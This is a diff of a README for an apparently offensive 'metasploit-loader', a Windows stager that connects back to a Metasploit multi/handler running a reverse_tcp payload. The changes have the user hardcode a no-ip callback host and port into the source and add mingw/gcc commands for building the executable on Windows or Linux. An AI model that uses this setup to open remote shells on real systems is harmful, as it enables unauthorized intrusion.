@@ -8,13 +8,19 @@ Reference:
 Use:
 
 1. Start a multi/handler with your favorite windows reverse_tcp payload
-2. Run: loader.exe [host] [port]
+2. Edit line 12 and 13 with credencias
+unsigned char server[] = "yourNoip.no-ip.org";
+unsigned char serverp[] = "YourPort";
 
 How to compile:
 
-1. Install mingw
-2. Edit build.bat if mingw is installed somewhere other than c:\mingw
-3. run build.bat
+Windows
+. Donwload gcc-4.9-win32
+1. gcc metasploit-loader.c -o metasploit-loader.exe -lws2_32
+
+LINUX 
+. apt-get install mingw32
+1. i586-mingw32msvc-gcc metasploit-loader.c -o metasploit-loader.exe -lws2_32
 
 ToDo:
 
